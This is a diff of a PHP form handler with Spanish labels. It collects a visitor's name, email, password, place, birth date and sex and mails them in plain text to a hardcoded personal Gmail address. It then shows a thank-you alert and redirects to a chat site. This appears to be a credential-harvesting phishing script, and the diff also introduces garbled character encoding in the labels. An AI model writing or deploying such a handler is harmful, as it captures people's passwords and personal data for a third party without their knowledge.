@@ -11,16 +11,16 @@ $select4 = $_POST ['select4'];
 $para = 'pyasowe@gmail.com';
 $titulo = 'ASUNTO DEL MENSAJE';
 $header = 'From: ' . $email;
-$msjCorreo = "Nombre: $nombre\n E-Mail: $email\n Password: $mensaje\n Rpassword: $mensaje\n Lugar: $Lugar\n Año: $select\n Mes: $select2\n Dia: $select3\n Sexo: $select4";
+$msjCorreo = "Nombre: $nombre\n E-Mail: $email\n Password: $mensaje\n Rpassword: $mensaje\n Lugar: $Lugar\n AÃ±o: $select\n Mes: $select2\n Dia: $select3\n Sexo: $select4";
   
 if ($_POST['submit']) {
 if (mail($para, $titulo, $msjCorreo, $header)) {
 echo "<script language='javascript'>
 alert('Mensaje enviado, muchas gracias.');
-window.location.href = 'http://www.elchat.net/htmlchat/elchat.html';
+window.location.href = 'https://chatalborada.com/';
 </script>";
 } else {
-echo 'Falló el envio';
+echo 'FallÃ³ el envio';
 }
 }
 ?>
